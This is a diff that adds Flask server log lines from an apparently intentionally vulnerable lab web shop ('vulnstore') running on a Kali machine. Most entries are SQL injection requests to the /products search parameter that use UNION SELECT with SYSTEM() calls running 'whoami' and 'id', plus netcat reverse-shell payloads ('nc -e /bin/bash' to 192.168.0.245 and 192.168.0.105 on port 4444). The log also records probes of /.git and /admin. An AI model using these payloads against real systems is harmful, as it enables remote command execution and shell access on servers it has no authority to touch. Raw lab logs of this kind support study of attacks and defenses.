+2025-08-16 12:41:34,883 -  * Debugger PIN: 130-425-084
+2025-08-16 12:41:38,707 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:41:38,798 - 192.168.0.242 - - [16/Aug/2025 12:41:38] "GET /products?search='%20UNION%20SELECT%201,2,3,4,5,6,7,8%20FROM%20products%20WHERE%201=1%20AND%20SYSTEM('whoami')%20-- HTTP/1.1" 200 -
+2025-08-16 12:41:39,433 - 192.168.0.242 - - [16/Aug/2025 12:41:39] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 12:41:43,685 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:41:43,754 - 192.168.0.242 - - [16/Aug/2025 12:41:43] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM('whoami')+-- HTTP/1.1" 200 -
+2025-08-16 12:41:44,624 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:41:44,695 - 192.168.0.242 - - [16/Aug/2025 12:41:44] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM('whoami')+-- HTTP/1.1" 200 -
+2025-08-16 12:41:45,167 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:41:45,240 - 192.168.0.242 - - [16/Aug/2025 12:41:45] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM('whoami')+-- HTTP/1.1" 200 -
+2025-08-16 12:41:48,607 - 192.168.0.242 - - [16/Aug/2025 12:41:48] "GET /products?search=test HTTP/1.1" 200 -
+2025-08-16 12:41:50,685 - 192.168.0.242 - - [16/Aug/2025 12:41:50] "GET /products?search=s HTTP/1.1" 200 -
+2025-08-16 12:42:08,873 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:42:08,943 - 192.168.0.241 - - [16/Aug/2025 12:42:08] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM('whoami')+-- HTTP/1.1" 200 -
+2025-08-16 12:42:10,379 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:42:10,459 - 192.168.0.242 - - [16/Aug/2025 12:42:10] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM('whoami')+-- HTTP/1.1" 200 -
+2025-08-16 12:42:30,450 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:42:30,523 - 192.168.0.242 - - [16/Aug/2025 12:42:30] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.245+444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:42:32,635 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:42:32,709 - 192.168.0.242 - - [16/Aug/2025 12:42:32] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.245+444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:42:37,519 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:43:49,333 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-16 12:43:49,422 -  * Restarting with stat
+2025-08-16 12:43:49,801 -  * Debugger is active!
+2025-08-16 12:43:49,802 -  * Debugger PIN: 130-425-084
+2025-08-16 12:43:50,480 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:43:50,627 - 192.168.0.241 - - [16/Aug/2025 12:43:50] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.245+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:43:51,395 - 192.168.0.241 - - [16/Aug/2025 12:43:51] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 12:43:56,778 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:43:56,859 - 192.168.0.242 - - [16/Aug/2025 12:43:56] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.245+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:43:56,975 - 192.168.0.242 - - [16/Aug/2025 12:43:56] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 12:43:59,223 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:43:59,301 - 192.168.0.242 - - [16/Aug/2025 12:43:59] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.245+444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:44:00,215 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:44:00,295 - 192.168.0.242 - - [16/Aug/2025 12:44:00] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.245+444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:44:10,165 - 192.168.0.241 - - [16/Aug/2025 12:44:10] "GET / HTTP/1.1" 200 -
+2025-08-16 12:44:11,607 - 192.168.0.241 - - [16/Aug/2025 12:44:11] "GET /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:44:13,143 - 192.168.0.242 - - [16/Aug/2025 12:44:13] "GET /products HTTP/1.1" 200 -
+2025-08-16 12:44:21,431 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:44:24,214 - 192.168.0.242 - - [16/Aug/2025 12:44:24] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.245+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:44:44,026 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:44:44,035 - 192.168.0.241 - - [16/Aug/2025 12:44:44] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.245+4444')+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:45:02,567 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:45:06,174 - 192.168.0.242 - - [16/Aug/2025 12:45:06] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.245+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:45:13,581 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:45:13,652 - 192.168.0.241 - - [16/Aug/2025 12:45:13] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:46:12,292 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-16 12:46:12,346 -  * Restarting with stat
+2025-08-16 12:46:12,541 -  * Debugger is active!
+2025-08-16 12:46:12,542 -  * Debugger PIN: 130-425-084
+2025-08-16 12:46:19,526 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:46:19,619 - 192.168.0.242 - - [16/Aug/2025 12:46:19] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:46:19,913 - 192.168.0.242 - - [16/Aug/2025 12:46:19] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 12:46:23,999 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:46:24,089 - 192.168.0.242 - - [16/Aug/2025 12:46:24] "GET /products?search='+UNION+SELECT+1,SYSTEM('id'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:46:25,236 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:46:25,328 - 192.168.0.242 - - [16/Aug/2025 12:46:25] "GET /products?search='+UNION+SELECT+1,SYSTEM('id'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:46:25,938 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:46:26,058 - 192.168.0.242 - - [16/Aug/2025 12:46:26] "GET /products?search='+UNION+SELECT+1,SYSTEM('id'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:46:54,616 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:46:54,709 - 192.168.0.242 - - [16/Aug/2025 12:46:54] "GET /products?search='+UNION+SELECT+1,SYSTEM('id'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:46:56,744 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:46:56,841 - 192.168.0.242 - - [16/Aug/2025 12:46:56] "GET /products?search='+UNION+SELECT+1,SYSTEM('id'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:46:57,159 - 192.168.0.242 - - [16/Aug/2025 12:46:57] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 12:46:58,039 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:46:58,128 - 192.168.0.242 - - [16/Aug/2025 12:46:58] "GET /products?search='+UNION+SELECT+1,SYSTEM('id'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:47:45,857 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-16 12:47:45,909 -  * Restarting with stat
+2025-08-16 12:47:46,110 -  * Debugger is active!
+2025-08-16 12:47:46,111 -  * Debugger PIN: 130-425-084
+2025-08-16 12:48:24,229 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-16 12:48:24,259 -  * Restarting with stat
+2025-08-16 12:48:24,451 -  * Debugger is active!
+2025-08-16 12:48:24,452 -  * Debugger PIN: 130-425-084
+2025-08-16 12:48:26,384 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:48:26,523 - 192.168.0.241 - - [16/Aug/2025 12:48:26] "GET /products?search='+UNION+SELECT+1,SYSTEM('id'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:48:26,568 - 192.168.0.241 - - [16/Aug/2025 12:48:26] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 12:48:26,571 - 192.168.0.241 - - [16/Aug/2025 12:48:26] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 12:48:27,402 - 192.168.0.241 - - [16/Aug/2025 12:48:27] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 12:48:43,512 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:48:43,584 - 192.168.0.242 - - [16/Aug/2025 12:48:43] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:48:43,627 - 192.168.0.242 - - [16/Aug/2025 12:48:43] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 12:48:43,628 - 192.168.0.242 - - [16/Aug/2025 12:48:43] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 12:49:15,841 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:49:15,917 - 192.168.0.242 - - [16/Aug/2025 12:49:15] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM('whoami')+-- HTTP/1.1" 200 -
+2025-08-16 12:49:15,977 - 192.168.0.242 - - [16/Aug/2025 12:49:15] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 12:49:15,979 - 192.168.0.242 - - [16/Aug/2025 12:49:15] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 12:49:30,100 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:49:37,927 - 192.168.0.242 - - [16/Aug/2025 12:49:37] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.245+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:49:37,969 - 192.168.0.241 - - [16/Aug/2025 12:49:37] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 12:49:37,971 - 192.168.0.241 - - [16/Aug/2025 12:49:37] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 12:49:44,928 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 13:01:04,422 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 14:04:08,576 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 14:04:08,690 - 192.168.0.242 - - [16/Aug/2025 14:04:08] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.105+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 14:04:08,741 - 192.168.0.242 - - [16/Aug/2025 14:04:08] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 14:04:08,743 - 192.168.0.242 - - [16/Aug/2025 14:04:08] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 14:04:27,436 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 14:21:18,958 - 192.168.0.221 - - [16/Aug/2025 14:21:18] "GET /.git HTTP/1.1" 200 -
+2025-08-16 14:21:26,663 - 192.168.0.221 - - [16/Aug/2025 14:21:26] "GET /admin HTTP/1.1" 200 -
+2025-08-16 14:21:26,852 - 192.168.0.221 - - [16/Aug/2025 14:21:26] "GET /favicon.ico HTTP/1.1" 200 -
+2025-08-16 14:21:34,226 - 192.168.0.221 - - [16/Aug/2025 14:21:34] "GET /login HTTP/1.1" 200 -
+2025-08-16 14:21:37,721 - 192.168.0.221 - - [16/Aug/2025 14:21:37] "[32mPOST /login HTTP/1.1[0m" 302 -
+2025-08-16 14:21:37,768 - 192.168.0.221 - - [16/Aug/2025 14:21:37] "GET /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 14:21:43,498 - 192.168.0.221 - - [16/Aug/2025 14:21:43] "GET /admin HTTP/1.1" 200 -
+2025-08-16 14:38:54,973 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 14:38:55,099 - 192.168.0.242 - - [16/Aug/2025 14:38:55] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.105+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 14:38:55,144 - 192.168.0.242 - - [16/Aug/2025 14:38:55] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 14:38:55,146 - 192.168.0.242 - - [16/Aug/2025 14:38:55] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 14:39:09,052 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 14:39:09,161 - 192.168.0.242 - - [16/Aug/2025 14:39:09] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.105+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 14:39:09,195 - 192.168.0.242 - - [16/Aug/2025 14:39:09] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 14:39:09,196 - 192.168.0.242 - - [16/Aug/2025 14:39:09] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 14:39:13,230 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 14:39:13,394 - 192.168.0.241 - - [16/Aug/2025 14:39:13] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.105+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 14:39:13,425 - 192.168.0.241 - - [16/Aug/2025 14:39:13] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 14:39:13,427 - 192.168.0.241 - - [16/Aug/2025 14:39:13] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 14:39:14,913 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 14:39:15,039 - 192.168.0.241 - - [16/Aug/2025 14:39:15] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.105+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 14:39:15,062 - 192.168.0.241 - - [16/Aug/2025 14:39:15] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 14:39:15,064 - 192.168.0.241 - - [16/Aug/2025 14:39:15] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 14:39:16,136 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 14:39:16,261 - 192.168.0.241 - - [16/Aug/2025 14:39:16] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.105+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 14:39:16,288 - 192.168.0.241 - - [16/Aug/2025 14:39:16] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 14:39:16,290 - 192.168.0.241 - - [16/Aug/2025 14:39:16] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 14:39:16,941 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 14:39:17,055 - 192.168.0.241 - - [16/Aug/2025 14:39:17] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.105+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 14:39:17,079 - 192.168.0.241 - - [16/Aug/2025 14:39:17] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 14:39:17,081 - 192.168.0.241 - - [16/Aug/2025 14:39:17] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 14:39:36,527 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 14:39:36,633 - 192.168.0.241 - - [16/Aug/2025 14:39:36] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.105+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 14:39:36,661 - 192.168.0.241 - - [16/Aug/2025 14:39:36] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 14:39:36,663 - 192.168.0.241 - - [16/Aug/2025 14:39:36] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 14:39:41,231 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 14:39:41,344 - 192.168.0.241 - - [16/Aug/2025 14:39:41] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.105+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 14:39:41,377 - 192.168.0.241 - - [16/Aug/2025 14:39:41] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 14:39:41,379 - 192.168.0.241 - - [16/Aug/2025 14:39:41] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 14:40:03,731 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 14:40:15,280 - 192.168.0.241 - - [16/Aug/2025 14:40:15] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.245+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 14:40:39,458 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 14:40:39,532 - 192.168.0.241 - - [16/Aug/2025 14:40:39] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 14:40:39,569 - 192.168.0.241 - - [16/Aug/2025 14:40:39] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 14:40:39,572 - 192.168.0.241 - - [16/Aug/2025 14:40:39] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 14:44:29,034 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-16 14:44:29,089 -  * Restarting with stat
+2025-08-16 14:44:29,316 -  * Debugger is active!
+2025-08-16 14:44:29,317 -  * Debugger PIN: 130-425-084
+2025-08-16 14:45:18,474 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-16 14:45:18,499 -  * Restarting with stat
+2025-08-16 14:45:18,714 -  * Debugger is active!
+2025-08-16 14:45:18,715 -  * Debugger PIN: 130-425-084
+2025-08-16 14:45:38,789 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-16 14:45:38,813 -  * Restarting with stat
+2025-08-16 14:45:39,016 -  * Debugger is active!
+2025-08-16 14:45:39,016 -  * Debugger PIN: 130-425-084
+2025-08-16 14:45:58,087 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-16 14:45:58,111 -  * Restarting with stat
+2025-08-16 14:45:58,308 -  * Debugger is active!
+2025-08-16 14:45:58,309 -  * Debugger PIN: 130-425-084
+2025-08-16 14:46:17,979 - 192.168.0.241 - - [16/Aug/2025 14:46:17] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 14:46:18,007 - 192.168.0.241 - - [16/Aug/2025 14:46:18] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 14:46:18,009 - 192.168.0.241 - - [16/Aug/2025 14:46:18] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 14:46:18,726 - 192.168.0.241 - - [16/Aug/2025 14:46:18] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 14:46:22,942 - 192.168.0.241 - - [16/Aug/2025 14:46:22] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 14:46:22,975 - 192.168.0.241 - - [16/Aug/2025 14:46:22] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 14:46:22,977 - 192.168.0.241 - - [16/Aug/2025 14:46:22] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 14:46:39,447 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-16 14:46:39,503 -  * Restarting with stat
+2025-08-16 14:46:39,723 -  * Debugger is active!
+2025-08-16 14:46:39,724 -  * Debugger PIN: 130-425-084
+2025-08-16 14:46:41,164 - 192.168.0.242 - - [16/Aug/2025 14:46:41] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 14:46:41,208 - 192.168.0.242 - - [16/Aug/2025 14:46:41] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 14:46:41,209 - 192.168.0.242 - - [16/Aug/2025 14:46:41] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 14:46:41,438 - 192.168.0.242 - - [16/Aug/2025 14:46:41] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 14:46:43,148 - 192.168.0.242 - - [16/Aug/2025 14:46:43] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 14:46:43,179 - 192.168.0.242 - - [16/Aug/2025 14:46:43] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 14:46:43,180 - 192.168.0.242 - - [16/Aug/2025 14:46:43] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 14:46:43,407 - 192.168.0.242 - - [16/Aug/2025 14:46:43] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 14:46:44,123 - 192.168.0.242 - - [16/Aug/2025 14:46:44] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 14:46:44,154 - 192.168.0.242 - - [16/Aug/2025 14:46:44] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 14:46:44,156 - 192.168.0.242 - - [16/Aug/2025 14:46:44] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 14:46:44,347 - 192.168.0.242 - - [16/Aug/2025 14:46:44] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 14:46:45,133 - 192.168.0.242 - - [16/Aug/2025 14:46:45] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 14:46:45,160 - 192.168.0.242 - - [16/Aug/2025 14:46:45] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 14:46:45,162 - 192.168.0.242 - - [16/Aug/2025 14:46:45] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 14:46:45,378 - 192.168.0.242 - - [16/Aug/2025 14:46:45] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 14:48:44,118 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-16 14:48:44,187 -  * Restarting with stat
+2025-08-16 14:48:44,429 -  * Debugger is active!
+2025-08-16 14:48:44,430 -  * Debugger PIN: 130-425-084
+2025-08-16 14:48:49,875 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 14:48:49,971 - 192.168.0.242 - - [16/Aug/2025 14:48:49] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 14:48:50,017 - 192.168.0.242 - - [16/Aug/2025 14:48:50] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 14:48:50,020 - 192.168.0.242 - - [16/Aug/2025 14:48:50] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 14:48:50,254 - 192.168.0.242 - - [16/Aug/2025 14:48:50] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 14:48:53,003 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 14:48:53,075 - 192.168.0.242 - - [16/Aug/2025 14:48:53] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 14:48:53,105 - 192.168.0.242 - - [16/Aug/2025 14:48:53] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 14:48:53,107 - 192.168.0.242 - - [16/Aug/2025 14:48:53] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 14:48:54,408 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 14:48:54,487 - 192.168.0.242 - - [16/Aug/2025 14:48:54] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 14:48:54,525 - 192.168.0.242 - - [16/Aug/2025 14:48:54] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 14:48:54,527 - 192.168.0.242 - - [16/Aug/2025 14:48:54] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 14:48:54,698 - 192.168.0.242 - - [16/Aug/2025 14:48:54] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 14:48:59,588 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 14:48:59,715 - 192.168.0.242 - - [16/Aug/2025 14:48:59] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.105+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 14:48:59,757 - 192.168.0.242 - - [16/Aug/2025 14:48:59] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 14:48:59,760 - 192.168.0.242 - - [16/Aug/2025 14:48:59] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 14:49:08,252 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 14:49:08,359 - 192.168.0.242 - - [16/Aug/2025 14:49:08] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.105+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 14:49:08,395 - 192.168.0.242 - - [16/Aug/2025 14:49:08] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 14:49:08,396 - 192.168.0.242 - - [16/Aug/2025 14:49:08] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 14:49:10,292 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 14:49:10,401 - 192.168.0.242 - - [16/Aug/2025 14:49:10] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.105+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 14:49:10,438 - 192.168.0.242 - - [16/Aug/2025 14:49:10] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 14:49:10,440 - 192.168.0.242 - - [16/Aug/2025 14:49:10] "GET /info.jpg HTTP/1.1" 200 -
